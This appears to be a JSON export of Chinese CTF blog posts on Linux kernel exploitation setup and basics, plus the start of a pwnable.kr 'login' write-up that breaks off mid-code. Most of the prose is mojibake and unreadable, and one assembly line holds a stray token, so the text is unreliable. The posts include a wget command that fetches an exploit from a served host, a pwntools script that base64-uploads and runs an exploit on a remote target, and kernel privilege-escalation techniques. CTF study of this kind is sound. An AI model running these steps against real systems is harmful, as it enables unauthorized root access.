¹ç›®å½•ä¸‹ï¼š\n\nfind ./* | cpio -H newc -o > file.cpio\n\nå½“å‰ç›®å½•ä¸‹å°±ç”Ÿæˆfile.cpioæ–‡ä»¶ï¼Œæ‹–åˆ°å’Œstart.shã€bzImageæ”¾åˆ°ä¸€ä¸ªç›®å½•ä¸‹ï¼Œè¿è¡Œstart.shå°±å¯ä»¥å¯åŠ¨qemuè™šæ‹Ÿæœºäº†ã€‚\n\n(5)-appendï¼šé™„åŠ çš„å­—ç¬¦ä¸²ï¼Œä¸ºgrubå¼•å¯¼å†…æ ¸æ—¶é™„åŠ çš„å‘½ä»¤è¡Œå‚æ•°ï¼ŒæŒ‡æ˜æ§åˆ¶å°ï¼Œç‰¹æƒï¼Œåˆå§‹è·¯å¾„ç­‰ï¼ŒæŒ‡å®šno kaslrå¯ä»¥å…³é—­éšæœºåç§»ã€‚\n\n-append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr\"\n\n(6)-sï¼šæ·»åŠ gdbè°ƒè¯•çš„ç›¸å…³æ¡ä»¶ï¼Œåªç”¨-så°±è¡Œï¼Œç­‰åŒäº-gdb tcp::1234\n\n(7)-cpu è®¾ç½®cpuå®‰å…¨é€‰é¡¹ã€‚kvm64æ˜¯åŠ é€Ÿå™¨\n\n-cpu kvm64,+smep  (kvm64ï¼Œå¼€å¯smepä¿æŠ¤)\n\n(8)--nographicï¼šè®¾ç½®ä¸ºæ— å›¾å½¢ç•Œé¢\n\nè¿˜æœ‰å…¶å®ƒçš„å„ç§é€‰é¡¹å‚æ•°ï¼Œé‡åˆ°é¢˜ç›®å†æŸ¥å§ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯smep,smap,kaslrç­‰ç›¸å…³çš„\n\n4.vmlinuxï¼šé™æ€ç¼–è¯‘ï¼Œæœªç»è¿‡å‹ç¼©çš„kernelæ–‡ä»¶ï¼ŒbzImageæ˜¯å‹ç¼©åçš„æ–‡ä»¶ã€‚\n\n \n\näºŒã€æ ¹æ–‡ä»¶ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼š\n\n1.initï¼šå¯åŠ¨ç³»ç»Ÿçš„å‚æ•°è®¾ç½®ï¼Œå¾ˆå¤šï¼Œæ…¢æ…¢çœ‹ï¼Œå¤šäº†è§£ã€‚\n\n(1)insmodï¼šåŠ è½½é©±åŠ¨ï¼Œä¸€èˆ¬å°±æ˜¯file.koæ–‡ä»¶ï¼Œæ‰¾åˆ°å®ƒæ¥åˆ†æã€‚\n\n(2)poweroffï¼šå…³æœºï¼Œç›¸å…³å®šæ—¶ä¸€èˆ¬å»æ‰\n\n(3)setsidï¼šè®¾ç½®ç»ˆç«¯æƒé™ï¼Œidä¸º0å³ä¸ºrootï¼Œæœ¬åœ°ä¿®æ”¹ä¸º0å³ä¸ºrootæƒé™\n\nsetsid /bin/cttyhack setuidgid 1000 /bin/sh\n\n2.file.koæ–‡ä»¶ï¼šä¸€èˆ¬è¿™ä¸ªå°±ç›¸å½“äºæ˜¯å¸¸è§„pwnçš„binaryæ–‡ä»¶ï¼Œæ¼æ´åº”è¯¥åœ¨è¿™é‡Œé¢ï¼Œå¯ä»¥ç”¨IDAæ‰“å¼€æ¥åˆ†æã€‚\n\n3.vmlinuxï¼šé¢˜ç›®æ²¡ç›´æ¥ç»™çš„ï¼Œä¸€èˆ¬cpioå‹ç¼©åŒ…ä¸­éƒ½ä¼šæœ‰ï¼Œå¯ä»¥ç”¨æ¥æŸ¥gadgetã€‚\n\ntime ropper --file ./vmlinux --nocolor > g1\n\ntime ROPgadget --binary ./vmlinux > g2\n\næ²¡æœ‰çš„ä¹Ÿå¯ä»¥æå–å‡ºæ¥ï¼š\n\n./extract-vmlinux ./bzImage > vmlinux\n\n(extract-vmlinuxæ–‡ä»¶ï¼šhttps://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux )\n\n4.å…¶å®ƒçš„å°±æ²¡ä»€ä¹ˆé‡è¦çš„äº†ï¼Œç„¶åæœ‰çš„é¢˜ç›®ä¼šæœ‰gen_cpio.shç›¸å…³æ–‡ä»¶ï¼Œç”¨æ¥ç”Ÿæˆcpioæ–‡ä»¶ï¼Œè¿™æ—¶å€™å°±ç›´æ¥ä½¿ç”¨ï¼Œå¦‚æœç”¨find ./* | cpio -H newc -o > file.cpioå¯èƒ½å¹¶ä¸å¤ªå¥½ä½¿ã€‚\n\n \n\n \n\nä¸‰ã€gdbè°ƒè¯•ï¼š\n\n1.start.shä¸­è®¾ç½®-sæˆ–è€…-gdb tcp::1234\n\n2.è®¾ç½®initä¸­çš„setsidï¼Œè®¾ç½®ä¸ºrootæƒé™\n\n3.åŠ è½½ç¬¦å·è¡¨ï¼š\n\n(1)qemuå†…ï¼š\n\ncat /sys/module/core/sections/.text  //æ‰¾åˆ°åŸºåœ°å€\n\n0xffffffffc018b000\n\n(2)qemuå¤–ï¼š\n\ngdb ./vmlinux -q\n\nadd-symbol-file ./file.ko 0xffffffffc018b000\n\n(ç°åœ¨å°±å¯ä»¥å¯¹å‡½æ•°ä¸‹æ–­ç‚¹ï¼šb core_readï¼Œæˆ–è€…æ ¹æ®file.koæ–‡ä»¶ä¸­çš„å‡½æ•°åç§»åŠ ä¸ŠåŸºåœ°å€ã€‚)\n\n4.è¿æ¥åˆ°qemuå†…éƒ¨çš„æ–‡ä»¶ï¼š\n\nqemuå¤–çš„gdbä¸­è¾“å…¥ï¼š\n\ntarget remote localhost:1234\n\nä¹‹åå°±å¯ä»¥äº’åŠ¨ï¼Œé€šè¿‡ç¼–å†™expå¯åŠ¨æ¥è§¦å‘æ–­ç‚¹ã€‚\n\n \n\n \n\nå››ã€ææƒï¼š\n\n(1)æœ¬åœ°ï¼š\n\nå°†ç¼–è¯‘åçš„exploitæ”¾åˆ°åˆå§‹æ ¹ç›®å½•æ–‡ä»¶ç³»ç»Ÿä¸­/temä¸­ï¼Œå†æ¬¡æ‰“åŒ…ç”Ÿæˆcpioæ–‡ä»¶ï¼Œè¿è¡Œqemuï¼Œä¹‹åè¿è¡Œexploitå³å¯ã€‚\n\n(2)è¿œç¨‹ï¼š\n\næœ¬åœ°å†™å¥½ exploit åï¼Œå¯ä»¥é€šè¿‡ base64 ç¼–ç ç­‰æ–¹å¼æŠŠç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¿å­˜åˆ°è¿œç¨‹ç›®å½•ä¸‹ï¼Œè¿›è€Œæ‹¿åˆ° flagã€‚åŒæ—¶å¯ä»¥ä½¿ç”¨ musl, uclibc ç­‰æ–¹æ³•å‡å° exploit çš„ä½“ç§¯æ–¹ä¾¿ä¼ è¾“ã€‚\n\nç¼–è¯‘ï¼šgcc exploit.c -static -masm=intel -g -o exploit\n\nå¯ä»¥ç”¨pythoné…ä¸Šbusyboxæ¥è®¾ç½®ï¼š\n\nâ‘ åœ¨æœ¬åœ°æœ‰exploitçš„æ–‡ä»¶å¤¹ä¸‹è¿è¡Œï¼špython2 -m SimpleHTTPServer\n\nè®°ä½æœ¬åœ°ipï¼Œç«¯å£ä¸º8000\n\nâ‘¡åœ¨è¿œç¨‹ä¸­è¿è¡Œï¼šwget -O ./exploit http://192.168.80.132:8000/exploit\n\nè¿™æ ·å°±å¯ä»¥é€šè¿‡ç½‘ç»œæ¥ä¼ è¾“exploit\n\n(3)çœŸå®é¢˜ç›®ç¯å¢ƒå¯èƒ½æ²¡æœ‰ç½‘ç»œï¼Œè¿™æ—¶å€™éœ€è¦ç”¨åˆ°è„šæœ¬ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom pwn import *\nimport os\n\n# context.log_level = 'debug'\ncmd = '# '\n\ndef exploit(r):\n    r.sendlineafter(cmd, 'stty -echo')\n    os.system('musl-gcc -static -O2 ./poc/exp.c -o ./poc/exp')\n    os.system('gzip -c ./poc/exp > ./poc/exp.gz')\n    r.sendlineafter(cmd, 'cat <<EOF > exp.gz.b64')\n    r.sendline((read('./poc/exp.gz')).encode('base64'))\n    r.sendline('EOF')\n    r.sendlineafter(cmd, 'base64 -d exp.gz.b64 > exp.gz')\n    r.sendlineafter(cmd, 'gunzip ./exp.gz')\n    r.sendlineafter(cmd, 'chmod +x ./exp')\n    r.sendlineafter(cmd, './exp')\n    r.interactive()\n\n\np = process('./boot.sh', shell=True)\n# p = remote('127.0.0.1',0000 )\n\nexploit(p)\n```\n\nè¿™é‡Œéœ€è¦åœ¨å½“å‰ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ª poc æ–‡ä»¶å¤¹ï¼ŒæŠŠ exp.c æ–‡ä»¶æ”¾è¿›å»ï¼Œæˆ–è€…è‡ªå·±ä¿®æ”¹ä¸‹è„šæœ¬ä¹Ÿå¯ä»¥ï¼Œå¦å¤–è¿˜éœ€è¦å®‰è£…musl-gccï¼Œåœ¨ubuntuä¸‹ï¼šapt-get install musl-tools\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191511955.jpeg)\n\nè¿™æ˜¯sixstars æˆ˜é˜Ÿä¸­ä¸€ä½å¸ˆå‚…çš„è„šæœ¬ï¼Œä¸çŸ¥é“æ˜¯å“ªä½å¤§ä½¬çš„ã€‚\n\n \n","tags":["Kernel-Knowledge"],"categories":["pwn-kernel"]},{"title":"pwn-kernel_å‰ç½®çŸ¥è¯†","url":"/2021/08/14/pwn-kernel_å‰ç½®çŸ¥è¯†/","content":"\nä¸€ã€å†…æ ¸å‰ç½®åŸºç¡€çŸ¥è¯†ï¼š\n\n1.physmapï¼š\n\nphysmapæ˜¯å†…æ ¸ç®¡ç†çš„ä¸€å—éå¸¸å¤§çš„è¿ç»­çš„è™šæ‹Ÿå†…å­˜ç©ºé—´ï¼Œä¸ºäº†æé«˜æ•ˆç‡ï¼Œè¯¥ç©ºé—´åœ°å€å’ŒRAMåœ°å€ç›´æ¥æ˜ å°„ã€‚RAMç›¸å¯¹physmapè¦å°å¾—å¤šï¼Œå¯¼è‡´äº†ä»»ä½•ä¸€ä¸ªRAMåœ°å€éƒ½å¯ä»¥åœ¨physmapä¸­æ‰¾åˆ°å…¶å¯¹åº”çš„è™šæ‹Ÿå†…å­˜åœ°å€ï¼Œè€Œç”¨æˆ·ç©ºé—´çš„è™šæ‹Ÿå†…å­˜ä¹Ÿä¼šæ˜ å°„åˆ°RAMã€‚\n\næ‰€ä»¥å¯èƒ½ä¼šå½¢æˆå¦‚ä¸‹å…³ç³»ï¼š\n\nusr_data--->RAM---->physmap\n\né‚£ä¹ˆphysmapä¸­å°±æœ‰å¯èƒ½ä¼šä¿å­˜usr_dataï¼Œé‚£ä¹ˆå°±ä¸ºææƒä»£ç æ”¾åˆ°å†…æ ¸ç©ºé—´æä¾›äº†å‰ç½®æ¡ä»¶ï¼ŒåŒæ—¶æœ‰mmapå°±å¯èƒ½ä¼šå¯¼è‡´æ¡ä»¶ç«äº‰ã€‚\n\n \n\n2.ioctlï¼šç³»ç»Ÿè°ƒç”¨ï¼Œç”¨äºä¸è®¾å¤‡é€šä¿¡\n\nç”±äºå†…æ ¸å’Œç”¨æˆ·ç©ºé—´éš”ç¦»å¼€ï¼Œæ‰€ä»¥å°±éœ€è¦ä¸€ä¸ªæ¥å£æ¥ä½¿å¾—ç”¨æˆ·å¯ä»¥åœ¨ä¸€å®šæƒ…å†µä¸‹è®¿é—®å†…æ ¸ç©ºé—´ï¼š\n\nint ioctl(int fd, unsigned long request, ...)\n\nç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ‰“å¼€è®¾å¤‡ (open) è¿”å›çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºç”¨æˆ·ç¨‹åºå¯¹è®¾å¤‡çš„æ§åˆ¶å‘½ä»¤ï¼Œå†åè¾¹çš„å‚æ•°åˆ™æ˜¯ä¸€äº›è¡¥å……å‚æ•°ï¼Œä¸è®¾å¤‡æœ‰å…³ã€‚\n\n \n\n \n\n3.çŠ¶æ€è½¬æ¢ç›¸å…³æ“ä½œï¼š\n\nå½“å‘ç”Ÿç³»ç»Ÿè°ƒç”¨ï¼Œäº§ç”Ÿå¼‚å¸¸ï¼Œå¤–è®¾äº§ç”Ÿä¸­æ–­ç­‰äº‹ä»¶æ—¶ï¼Œä¼šå‘ç”Ÿç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„åˆ‡æ¢\n\nENTRY(entry_SYSCALL_64)\n\n(1).ç”¨æˆ·æ€è‡³å†…æ ¸æ€ï¼š\n\nâ‘ swapgsæŒ‡ä»¤è§¦å‘ï¼Œåˆ‡æ¢åˆ°kernel GSï¼š\n\nSWAPGS_UNSAFE_STACK\n\nâ‘¡ä¿å­˜æ ˆå€¼ï¼Œè®¾ç½®å†…æ ¸æ ˆï¼š\n\nmovq %rsp, PER_CPU_VAR(rsp_scratch)\n\nmovq PER_CPU_VAR(cpu_current_top_of_stack), %rsp\n\nâ‘¢å‹æ ˆä¿å­˜å¯„å­˜å™¨ï¼š\n\n```\n#æ³¨é‡Šå¤´ \n\n/* Construct struct pt_regs on stack */\npushq  $__USER_DS      /* pt_regs->ss */\npushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs->sp */\npushq  %r11             /* pt_regs->flags */\npushq  $__USER_CS      /* pt_regs->cs */\npushq  %rcx             /* pt_regs->ip */\npushq  %rax             /* pt_regs->orig_ax */\npushq  %rdi             /* pt_regs->di */\npushq  %rsi             /* pt_regs->si */\npushq  %rdx             /* pt_regs->dx */\npushq  %rcx tuichu    /* pt_regs->cx */\npushq  $-ENOSYS        /* pt_regs->ax */\npushq  %r8              /* pt_regs->r8 */\npushq  %r9              /* pt_regs->r9 */\npushq  %r10             /* pt_regs->r10 */\npushq  %r11             /* pt_regs->r11 */\nsub $(6*8), %rsp      /* pt_regs->bp, bx, r12-15 not saved */\n```\n\nâ‘£åˆ¤æ–­ç±»å‹å¹¶è·³è½¬ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nmovq PER_CPU_VAR(current_task), %r11\ntestl $_TIF_WORK_SYSCALL_ENTRY|_TIF_ALLWORK_MASK, TASK_TI_flags(%r11)\njnz entry_SYSCALL64_slow_path\n```\n\nâ–²\n\n```\n#æ³¨é‡Šå¤´\n\nentry_SYSCALL64_slow_path:\n  /* IRQs are off. */\n  SAVE_EXTRA_REGS\n  movq    %rsp, %rdi\n  call    do_syscall_64        /* returns with IRQs disabled */\n```\n\n(2)å†…æ ¸æ€è‡³ç”¨æˆ·æ€ï¼š\n\nâ‘ swapgsæ¢å¤GS\n\nâ‘¡iretqï¼ˆåŠ ä¸Šå¯„å­˜å™¨ä¿¡æ¯ï¼‰æˆ–sysretqï¼Œå¦‚æœä½¿ç”¨ iretq è¿˜éœ€è¦ç»™å‡ºç”¨æˆ·ç©ºé—´çš„ä¸€äº›ä¿¡æ¯ï¼ˆCS, eflags/rflags, esp/rsp ç­‰ï¼‰\n\nkernel çš„ crash é€šå¸¸ä¼šå¼•èµ·é‡å¯\n\n \n\n \n\n4.ç›¸å…³ä¿æŠ¤æŠ€æœ¯Mitigationï¼š\n\n(1)SMAPå’ŒSMEPä¿æŠ¤æŠ€æœ¯ï¼š\n\n(armé‡Œé¢å«PXN(Privilege Execute Never)å’ŒPAN(Privileged Access Never))\n\nâ‘ SMAP:ç¦æ­¢å†…æ ¸è®¿é—®ç”¨æˆ·ç©ºé—´çš„æ•°æ®(Supervisor Mode Access Prevention)\n\nâ‘¡SMEP:ç¦æ­¢å†…æ ¸æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„ä»£ç (Supervisor Mode Execution Prevention)\n\nå†…æ ¸å‘½ä»¤è¡Œä¸­æ·»åŠ nosmapå’Œnosmepç¦ç”¨\n\n(2)kernel canary:\n\nç¼–è¯‘å†…æ ¸æ—¶è®¾ç½®CONFIG_CC_STACKPROTECTORï¼Œå¯ä»¥èµ·åˆ°ç±»ä¼¼äºstack canaryçš„æŠ€æœ¯ã€‚\n\n(3)KALSRï¼šå†…æ ¸åœ°å€éšæœºåŒ–\n\n \n\n \n\n5.ææƒä»£ç ä¸å‡½æ•°ç»“æ„ä½“ï¼š\n\ncredç»“æ„ä½“ï¼škernelç”¨credç»“æ„ä½“è®°å½•è¿›ç¨‹æƒé™(æ¯ä¸ªç»“æ„éƒ½æœ‰ä¸€ä¸ªcredç»“æ„)ï¼Œä¿å­˜äº†è¿›ç¨‹çš„ç›¸å…³ä¿¡æ¯ï¼Œå¦‚æœåˆ©ç”¨è¿™ä¸ªcredå°±å¯ä»¥ææƒã€‚ä¸€èˆ¬è°ƒç”¨commit_creds(prepare_kernel_cred(0))å®Œæˆææƒç„¶åç”¨æˆ·æ€â€œç€é™†â€èµ·shellã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nstruct cred {\n    atomic_t    usage;\n#ifdef CONFIG_DEBUG_CREDENTIALS\n    atomic_t    subscribers;           /* number of processes subscribed */\n    void        *put_addr;\n    unsigned    magic;\n#define CRED_MAGIC  0x43736564\n#define CRED_MAGIC_DEAD 0x44656144\n#endif\n    kuid_t      uid;                   /* real UID of the task */\n    kgid_t      gid;                   /* real GID of the task */\n    kuid_t      suid;                  /* saved UID of the task */\n    kgid_t      sgid;                  /* saved GID of the task */\n    kuid_t      euid;                  /* effective UID of the task */\n    kgid_t      egid;                  /* effective GID of the task */\n    kuid_t      fsuid;                 /* UID for VFS ops */\n    kgid_t      fsgid;                 /* GID for VFS ops */\n    unsigned    securebits;            /* SUID-less security management */\n    kernel_cap_t    cap_inheritable;   /* caps our children can inherit */\n    kernel_cap_t    cap_permitted;     /* caps we're permitted */\n    kernel_cap_t    cap_effective;     /* caps we can actually use */\n    kernel_cap_t    cap_bset;          /* capability bounding set */\n    kernel_cap_t    cap_ambient;       /* Ambient capability set */\n#ifdef CONFIG_KEYS\n    unsigned char   jit_keyring;       /* default keyring to attach requested\n    /* keys to */\n    struct key __rcu *session_keyring; /* keyring inherited over fork */\n    struct key  *process_keyring;      /* keyring private to this process */\n    struct key  *thread_keyring;       /* keyring private to this thread */\n    struct key  *request_key_auth;     /* assumed request_key authority */\n#endif\n#ifdef CONFIG_SECURITY\n    void        *security;             /* subjective LSM security */\n#endif\n    struct user_struct *user;          /* real user ID subscription */\n    struct user_namespace *user_ns;    /* user_ns the caps and keyrings are relative to. */\n    struct group_info *group_info;     /* supplementary groups for euid/fsgid */\n    struct rcu_head rcu;               /* RCU deletion hook */\n} __randomize_layout;\n```\n\nä¸åŒå†…æ ¸ç‰ˆæœ¬çš„credç»“æ„ä½“å¯èƒ½ä¸å¤ªä¸€æ ·ã€‚\n\n \n\näºŒã€å†…æ ¸æ€å‡½æ•°åŠç›¸å…³å˜åŒ–ï¼š\n\n1.printf() -> printk()ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯ printk() ä¸ä¸€å®šä¼šæŠŠå†…å®¹æ˜¾ç¤ºåˆ°ç»ˆç«¯ä¸Šï¼Œä½†ä¸€å®šåœ¨å†…æ ¸ç¼“å†²åŒºé‡Œï¼Œå¯ä»¥é€šè¿‡ dmesg æŸ¥çœ‹æ•ˆæœ\n\n2.malloc() -> kmalloc()ï¼Œå†…æ ¸æ€çš„å†…å­˜åˆ†é…å‡½æ•°ï¼Œå’Œmalloc()ç›¸ä¼¼ï¼Œä½†ä½¿ç”¨çš„æ˜¯slab/slubåˆ†é…å™¨ã€‚\n\n3.free() -> kfree()ï¼ŒåŒ kmalloc()\n\n4.memcpy() -> copy_from_user()/copy_to_user()\n\n5.copy_from_user() å®ç°äº†å°†ç”¨æˆ·ç©ºé—´çš„æ•°æ®ä¼ é€åˆ°å†…æ ¸ç©ºé—´\n\n6.copy_to_user() å®ç°äº†å°†å†…æ ¸ç©ºé—´çš„æ•°æ®ä¼ é€åˆ°ç”¨æˆ·ç©ºé—´\n\n7.ææƒç›¸å…³å‡½æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nint commit_creds(struct cred *new)\nstruct cred* prepare_kernel_cred(struct task_struct* daemon)\n```\n\næ‰§è¡Œcommit_creds(prepare_kernel_cred(0))å³å¯è·å¾— root æƒé™\n\nå‡½æ•°åœ°å€å¯åœ¨/proc/kallsymsï¼Œè€ç‰ˆæœ¬/proc/ksymsä¸­æŸ¥çœ‹(cat|grep)ï¼Œæƒé™ä¸€èˆ¬éœ€è¦root\n\n \n\n \n\nä¸‰ã€ä¿æŠ¤ç»•è¿‡æŠ€æœ¯ï¼š\n\n1.ret2usr:\n\nåœ¨æ²¡æœ‰SMAP/SMEPçš„æƒ…å†µä¸‹æŠŠå†…æ ¸æŒ‡é’ˆé‡å®šå‘åˆ°ç”¨æˆ·ç©ºé—´çš„æ¼æ´åˆ©ç”¨æ–¹å¼è¢«ç§°ä¸ºret2usr\n\n2.ret2dirï¼š\n\nå¦‚æœç”¨æˆ·ç©ºé—´ç”¨mmap()æŠŠææƒä»£ç æ˜ å°„åˆ°å†…å­˜RAMï¼Œé‚£ä¹ˆå°±å¯ä»¥åœ¨physmapé‡Œæ‰¾åˆ°å…¶å¯¹åº”çš„å‰¯æœ¬ï¼Œå°±å¯ä»¥ä¿®æ”¹EIPè·³åˆ°å‰¯æœ¬æ‰§è¡Œï¼Œè¿™ç§åˆ©ç”¨æ–¹å¼è¢«ç§°ä¸ºret2dirã€‚\n\n3.kernel canary:\n\nç»•è¿‡æ–¹æ³•åŒç”¨æˆ·ç©ºé—´çš„canaryç»•è¿‡å¤§è‡´ç›¸åŒï¼Œç¼–è¯‘å†…æ ¸æ—¶è®¾ç½®CONFIG_CC_STACKPROTECTORï¼Œå¯ä»¥èµ·åˆ°ç±»ä¼¼äºstack canaryçš„æŠ€æœ¯ã€‚\n\n \n\n \n\n \n\n \n\n \n","tags":["Kernel-Knowledge"],"categories":["pwn-kernel"]},{"title":"pwnable.kr-login","url":"/2021/08/14/pwnable.kr-login/","content":"\n1.å¸¸è§„checksecä¸€ä¸‹ï¼Œå¼€äº†canaryå’ŒNXï¼Œç„¶åIDAæ‰“å¼€åˆ†ææ¼æ´ã€‚å‘ç°authå‡½æ•°ä¸­å¯èƒ½å­˜åœ¨æ ˆæº¢å‡ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nint v4; // [esp+20h] [ebp-8h]\n------------------------------------\nmemcpy(&v4, &input, a1);\n```\n\nå¦‚æœa1å¤§äº8hï¼Œè€Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶inputï¼Œé‚£ä¹ˆå°±å¯ä»¥é€ æˆæ ˆæº¢å‡ºã€‚å†å¾€ä¸Šç¿»ä¸€ä¸‹ï¼Œå‘ç°å°±æ˜¯å°†æˆ‘ä»¬çš„è¾“å…¥é€šè¿‡ä¸€ç³»åˆ—æ“ä½œç»™åˆ°inputï¼Œç„¶åa1æ˜¯inputçš„é•¿åº¦ã€‚\n\nå®é™…æƒ…å†µæ˜¯å°†æˆ‘ä»¬çš„è¾“å…¥ç»™sï¼Œè¿›è¡ŒBase64è§£ç ï¼Œç„¶åç»™v4ï¼Œé•¿åº¦ç»™v6ã€‚v4åˆç»™inputï¼Œv6ä¼ å€¼åˆ°è¾¾authå‡½æ•°èµ‹å€¼ç»™a1ã€‚è¿™é‡Œinputæ˜¯å…¨å±€å˜é‡ï¼Œæ‰€ä»¥authå‡½æ•°ä¸­çš„inputä¸­çš„å†…å®¹å…¶å®å°±æ˜¯æˆ‘ä»¬è¾“å…¥ç»è¿‡base64è§£ç çš„å†…å®¹ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\n_isoc99_scanf(\"%30s\", &s);\n--------------------------------------------------\nv6 = Base64Decode((int)&s, &v4);\n--------------------------------------------------\nmemcpy(&input, v4, v6);\n------------------------------------------------------\nauth(v6) == 1\n```\n\nâ–²é¢˜å¤–è¯ï¼šæœ€å¼€å§‹Base64æä¸æ‡‚å“ªä¸ªæ˜¯è¾“å…¥ï¼Œå“ªä¸ªæ˜¯è¾“å‡ºï¼Œç›´æ¥ç»è¿‡è°ƒè¯•å°±å¯ä»¥åˆ¤æ–­ã€‚å†µä¸”æœ€å¼€å§‹çš„v4æ˜¯0ï¼Œæ€»ä¸èƒ½ç¨‹åºæ°¸è¿œéƒ½å°†0è¿›è¡Œbase64è§£ç ç„¶ç»™åˆ°æˆ‘ä»¬çš„è¾“å…¥åœ°å€ä¸­å§ã€‚ä½†æ˜¯è°ƒè¯•çš„æ—¶å€™å‘ç°ï¼Œæ¯æ¬¡è¾“å…¥ç›¸åŒçš„å€¼ï¼Œä½†æ˜¯è§£ç åå¾—åˆ°çš„v4çš„å€¼å´æ˜¯ä¸ä¸€æ ·çš„ã€‚è¿™å°±çº³é—·äº†ï¼Œä¸ºä»€ä¹ˆä¸€æ ·çš„è¾“å…¥å››ä¸ªAAAAå¾—åˆ°çš„è§£ç å€¼ä¸ä¸€æ ·å‘¢ï¼Œéš¾é“ç¨‹åºè¿˜æœ‰ä¸ªéšæœºå˜é‡ä¸æˆã€‚ä¹‹åå†ä»”ç»†è°ƒè¯•å‘ç°è¿™ä¸ªbase64decodeæœ‰ç‚¹ä¸ä¸€æ ·ï¼Œè™½ç„¶ä¼ å…¥çš„ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯åœ°å€ï¼Œä½†æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°çš„æ“ä½œå´æ˜¯ä»è¯¥åœ°å€ç›´æ¥å–å€¼è¿›è¡Œè§£ç ï¼Œç„¶åå¯¹äºç¬¬äºŒä¸ªå‚æ•°çš„æ“ä½œå´å¹¶ä¸æ˜¯å°†è§£ç ç»“æœç»™åˆ°ç¬¬äºŒä¸ªå‚æ•°ï¼Œè€Œæ˜¯å†å¼€è¾Ÿä¸€å—å †å†…å­˜ï¼Œä¹‹åå°†è¯¥å †å†…å­˜çš„åœ°å€ç»™åˆ°ç¬¬äºŒä¸ªå‚æ•°ã€‚æ‰€ä»¥æ¯æ¬¡è§£ç åç¬¬äºŒä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯æ ˆä¸Šçš„ä¸€ä¸ªå€¼ï¼Œæ€»æ˜¯ä¸ä¸€æ ·ï¼Œå› ä¸ºè¿™é‡Œä¿å­˜çš„æ˜¯ä¸€ä¸ªéšæœºç”Ÿæˆçš„å †åœ°å€ï¼Œè€Œä¸æ˜¯è§£ç åçš„å€¼ã€‚åŒæ ·ä¹‹åè§‚å¯Ÿmainå‡½æ•°ä¸­çš„memcpyä¹Ÿå¯ä»¥å‘ç°ï¼šmemcpy(&input, v4, v6);è€Œmemcpyçš„åŸå‹æ˜¯ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nvoid *memcpy(void *dest, const void *src, size_t n)\n```\n\nå‰ä¸¤ä¸ªå‚æ•°ç±»å‹éƒ½åº”è¯¥æ˜¯åœ°å€æ‰å¯¹ï¼Œè€Œè¿™é‡Œå´ç›´æ¥å°†v4çš„å€¼ç»™ä¼ è¿›å»ï¼Œé‚£ä¸å°±è¯´æ˜v4çš„å€¼æ˜¯ä¸€ä¸ªåœ°å€å—ã€‚ç„¶åå†è·³è½¬åˆ°æ±‡ç¼–ä»£ç åˆ†æä¸€æ³¢:\n\n```\n#æ³¨é‡Šå¤´\n\n.text:080493B3   call _memset\n.text:080493B8   mov dword ptr [esp+18h], 0\n.text:080493C0   lea eax, [esp+18h]\n.text:080493C4   mov [esp+4], eax\n.text:080493C8   lea eax, [esp+1Eh]\n.text:080493CC   mov [esp], eax\n.text:080493CF   call Base64Decode\n```\n\nåŒæ ·Base64Decodeå‡½æ•°çš„ä¸¤ä¸ªå‚æ•°ä¹Ÿéƒ½æ˜¯åœ°å€ï¼Œè¿™é‡Œæ˜¯ç›´æ¥å–æ ˆåœ°å€ç»™åˆ°eaxï¼Œç„¶åå†å°†eaxçš„å€¼ç»™ç›¸åº”espæŒ‡å‘çš„æ ˆå†…å­˜ã€‚æ‰€ä»¥å¯ä»¥çœ‹åˆ°Base64Decodeå–å€¼åº”è¯¥æ˜¯ä»æ ˆä¸Šå–ä¸¤ä¸ªåœ°å€æ‰å¯¹ï¼Œåˆ†åˆ«ä½äºmainå‡½æ•°æ ˆçš„æ˜¯esp+4å’Œespã€‚æ‰€ä»¥å¦‚æœè¿™é‡Œæœ‰ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²é‚£ä¹ˆå°±å®Œå…¨å¯ä»¥æ³„éœ²å¤„å‡ºæ ˆåœ°å€ï¼Œä¹‹åå°±å®Œå…¨å¯æ§ï¼Œå¯æƒœæ²¡æœ‰ã€‚è¿˜æ˜¯å›åˆ°æ­£è½¨åˆ†æå§ã€‚\n\n2.æ‰€ä»¥ç»è¿‡å‰é¢åˆ†æï¼Œç¨‹åºè¦æ±‚æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªbase64ç¼–ç è¿‡çš„å­—ç¬¦ä¸²ï¼Œéšåä¼šè¿›è¡Œè§£ç å¹¶ä¸”å¤åˆ¶åˆ°ä½äºbssæ®µçš„å…¨å±€å˜é‡inputä¸­ï¼Œæœ€åä½¿ç”¨authå‡½æ•°è¿›è¡ŒéªŒè¯ï¼Œé€šè¿‡åè¿›å…¥å¸¦æœ‰åé—¨çš„correct()æ‰“å¼€shellã€‚å¹¶ä¸”ç”±äºé•¿åº¦æœ‰é™åˆ¶ï¼šæ‰€ä»¥æˆ‘ä»¬çš„è¾“å…¥base64è§£ç åæœ€å¤šåªèƒ½æœ‰12ä¸ªå­—èŠ‚ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nif ( v6 > 12 )\n{\n    puts(\"Wrong 